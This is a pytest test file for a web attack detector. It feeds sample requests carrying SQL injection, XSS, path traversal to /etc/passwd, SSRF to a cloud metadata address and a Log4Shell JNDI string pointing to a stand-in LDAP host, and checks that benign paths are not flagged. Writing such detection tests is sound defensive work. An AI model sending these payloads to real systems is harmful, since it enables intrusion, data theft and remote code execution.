import pytest
from app.rules import detect


def rec(path, ua="Mozilla/5.0"):
    return {"path": path, "ua": ua}


@pytest.mark.parametrize("path,expected", [
    ("/search?q=1' OR 1=1--", "sqli"),
    ("/search?q=1%20UNION%20SELECT%20null,null", "sqli"),
    ("/comment?c=<script>alert(1)</script>", "xss"),
    ("/comment?c=%3Cscript%3E", "xss"),
    ("/download?f=../../etc/passwd", "path_traversal"),
    ("/download?f=%252e%252e%252fetc/passwd", "path_traversal"),
    ("/fetch?url=http://169.254.169.254/latest/meta-data", "ssrf"),
])
def test_attacks_detected(path, expected):
    assert expected in detect(rec(path))


def test_log4shell_in_user_agent():
    assert "log4shell" in detect(rec("/", ua="${jndi:ldap://x.x/a}"))


@pytest.mark.parametrize("path", ["/", "/profile?id=3", "/search?q=network+security", "/static/app.css"])
def test_benign_not_flagged(path):
    assert detect(rec(path)) == []
